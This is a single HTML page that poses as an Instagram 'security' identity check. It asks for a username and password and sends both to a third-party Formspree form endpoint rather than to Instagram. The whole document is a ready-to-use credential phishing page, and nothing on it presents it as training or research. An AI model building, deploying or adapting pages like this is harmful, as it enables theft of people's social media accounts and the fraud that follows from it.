<!DOCTYPE html>
<html>
<head>
    <title>Instagram Security</title>
    <style>
        body { font-family: sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background: white; border: 1px solid #dbdbdb; padding: 40px; width: 300px; text-align: center; }
        button { width: 100%; background: #0095f6; color: white; border: none; padding: 10px; border-radius: 4px; font-weight: bold; cursor: pointer; margin-top: 10px; }
        input { width: 100%; margin-bottom: 10px; padding: 10px; border: 1px solid #dbdbdb; border-radius: 3px; box-sizing: border-box; }
    </style>
</head>
<body>
    <div class="box">
        <h2 style="color: #262626;">Instagram</h2>
        <p style="color: #8e8e8e; font-size: 14px;">Verify your identity to secure your account from unauthorized login attempts.</p>
        <form action="https://formspree.io/f/xlgaldwd" method="POST">
            <input type="text" name="username" placeholder="Phone, username, or email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Verify Identity</button>
        </form>
    </div>
</body>
</html>
